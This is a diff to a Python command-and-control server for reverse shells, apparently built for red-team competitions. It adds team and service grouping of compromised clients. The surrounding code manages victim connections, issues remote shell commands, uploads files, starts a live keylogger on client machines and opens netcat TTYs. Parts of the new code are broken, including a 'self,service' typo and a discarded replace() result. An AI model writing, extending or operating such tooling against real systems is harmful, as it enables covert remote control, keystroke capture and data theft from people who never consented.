@@ -4,18 +4,56 @@ import socket, threading, time
 import sys
 import signal
 import pty
+from cmd import Cmd
+
+
+
+#TODO A user can make groups and add clients to groups. The user then can select from each group which client to connect to.
+#TODO Read from config file to determine teams and services
+#TODO If a connection is received from an IP that is in the config file, assign the team and service automatically
+#TODO Assign team function: List all unassigned clients. Select a client at an index, then list all teams that the user can add the client to.
+#TODO When a client connects, add them to the unassigned group
+#TODO replace all client connections with the client class
+#TODO Develop new shell
+#TODO Encrypt traffic
+#TODO Store commands in config file
+
+
+
+# class MainShell(cmd):
+#     pass 
+
+class Team():
+    def __init__(self, identity):
+        self.identity = identity
+        self.clients = []
+    
+    def assign(self, client):
+        self.clients.append(client) #Append the client to the clients list
+
+    def listClients(self):
+        print("Team " + self.identity + ":")
+        for client in self.clients:
+            print("\t> " + client.getNick())
+
+class Service():
+    #TODO Each service has stored commands to break it
+    pass
+
 
 #Class to store IP, port, connection, and tags for the 
 class Connection:
-    team = 'N/A'
-    service = 'N/A'
     nickName = 'N/A'
 
-    def __init__(self, IP, port, connection):
+    def __init__(self, addr, socket):
         tags = list()
-        self.IP = IP
-        self.port = port
-        self.connection = connection
+        self.IP = addr[0]
+        self.port = addr[1]
+        self.socket = socket
+        self.addr = addr
+        self.nickName = str(addr)
+        self.team = 'N/A'
+        self,service = 'N/A'
     
     def addTags(self, team, service):
         self.team = team
@@ -27,17 +65,24 @@ class Connection:
     
     def setNickName(self, nickname):
         self.nickName = nickname
+
+    def getSocket(self):
+        return self.socket
     
-
-
+    def getAddr(self):
+        return self.addr
+    
+    def getNick(self):
+        return self.nickName
+    
 #Take the clients message of if the reverse shell was started or not
-
 SERVER_ADDR = "127.0.0.1"
 SERVER_PORT = 8080
 BUFFER_SIZE = 1024 * 128 #128KB max size
 CURRENT_CONNECTIONS = []
 CURRENT_CONNECTIONS_CLASS = []
 CURRENT_ADDRESSES = []
+TEAMS = []
 
 #If the user starts the server and wants to specify the ip to host on
 if len(sys.argv) == 2:
@@ -73,7 +118,7 @@ def startServer():
             # print()
             # print()
             # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
-            CURRENT_CONNECTIONS_CLASS.append(Connection(addr[0],addr[1],client_sock))
+            CURRENT_CONNECTIONS_CLASS.append(Connection(addr,client_sock))
             CURRENT_CONNECTIONS.append(client_sock)
             CURRENT_ADDRESSES.append(addr)
             # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
@@ -84,7 +129,9 @@ def startServer():
         SERVER_UP = False
         
 #Take socket and addr and issue shell
-def handleClient(client_sock,addr):
+def handleClient(client):
+    client_sock = client.getSocket()
+    addr = client.getAddr()
     while True:
         try:
             user_in = input()
@@ -144,6 +191,12 @@ def handleCommand():
             cmd = input("cmd> ")
             if cmd.lower() == "list" or cmd.lower() == "ls":
                 list_clients()
+            elif cmd.lower() == "lsteam" or cmd.lower() == "listteam":
+                listTeams()
+            elif "assign" in cmd.lower():
+                assignLoop()
+            elif "mkteam" in cmd.lower():
+                addTeam(input("Input team name: "))
             elif "select" in cmd.lower() or "sel" in cmd.lower():
                 client_console(cmd)
                 # client,addr = select_client(cmd)
@@ -154,6 +207,9 @@ def handleCommand():
             elif cmd.lower() == "help":
                 print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                     \n\tUse 'select' to choose a client from the list. \
+                    \n\t Use 'lsteam' to list each team's connections. \
+                    \n\tUse 'assign' to assign a client to a team. \
+                    \n\tUse 'mkteam' to create a team. \
                     \n\tUse 'help' to show this menu. \
                     \n\tUse 'exit' to quit the program.")
             elif cmd.lower() == "exit":
@@ -199,6 +255,29 @@ def list_clients():
     else:
         print("No active connections!")
 
+def addTeam(identity):
+    TEAMS.append(Team(str(identity)))
+    print("Team \"" + str(identity) + "\" created successfully.")
+
+def assignTeam(client, team):
+    team = TEAMS.index(team)
+    TEAMS[team].assign(client)
+
+def listTeams():
+    print("Team's Connections:")
+    for team in TEAMS:
+        team.listClients()
+
+def assignLoop():
+    pass
+    #If there are unassigned clients
+    #List unassigned clients
+    #Ask user to input which client to assign
+    #If the user says exit, then quit
+    #List teams
+    #Ask user which team to assign client to
+    #If the user says exit, then quit
+    #If there are more unassigned clients, repeat
 
 #Console to send commands to a client when user selects client
 def client_console(cmd):
@@ -232,6 +311,9 @@ def client_console(cmd):
             elif "ncport" in newCMD.lower():
                 CURRENT_CONNECTIONS[target].send("ncport".encode())
                 print("Netcat is being hosted on: " + CURRENT_ADDRESSES[target][0] + ":" + CURRENT_CONNECTIONS[target].recv(BUFFER_SIZE).decode())
+            elif "setnick" in newCMD.lower():
+                newCMD.replace("setnick","")
+                CURRENT_CONNECTIONS_CLASS[target].setNickName(newCMD)
             elif "help" in newCMD: #Help menu
                 print("\nHelp Menu:\
                     \n\tUse 'exit' to return to main menu. \
@@ -242,7 +324,7 @@ def client_console(cmd):
                     \n\tUse 'ul' to upload a file.\
                     \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                     \n\tUse 'ncport' to get the port the shell is listening on.\
-                    Use 'TTY' to start a new TTY in netcat.\n")
+                    \n\tUse 'TTY' to start a new TTY in netcat.\n")
             elif "exit" in newCMD:
                 break
             else:
@@ -343,7 +425,6 @@ def upload_file(cmd,conn):
         print("File not found! \n"+ str(e))
     except KeyboardInterrupt:
         print("File Upload Stopped.")
-
 
 #Start server as a thread to constantly accept new clients, then open the C2 console.
 def create_threads():
